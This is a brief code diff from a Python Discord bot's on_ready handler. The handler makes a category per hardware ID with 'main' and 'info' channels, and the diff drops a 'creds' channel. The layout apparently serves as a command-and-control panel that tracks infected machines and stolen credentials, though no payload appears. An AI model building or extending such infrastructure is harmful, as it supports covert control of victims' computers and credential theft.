@@ -62,7 +62,6 @@ async def on_ready():
         category = await guild.create_category(hwid)
         await guild.create_text_channel('main', category=category)
         await guild.create_text_channel('info', category=category)
-        await guild.create_text_channel('creds', category=category)
         
         for channel in category.channels:
                 
